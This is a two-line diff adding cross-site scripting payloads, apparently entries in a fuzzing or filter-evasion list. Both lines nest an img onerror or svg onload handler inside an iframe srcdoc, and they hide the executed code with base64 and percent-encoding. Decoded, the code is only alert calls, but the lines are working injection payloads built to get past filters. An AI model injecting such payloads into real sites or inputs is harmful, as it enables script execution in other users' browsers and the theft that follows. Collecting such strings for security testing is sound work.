@@ -1,0 +1,2 @@
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMTEp'))>">
+<iframe srcdoc="<svg onload=eval(decodeURIComponent('%61%6c%65%72%74(49)'))>">
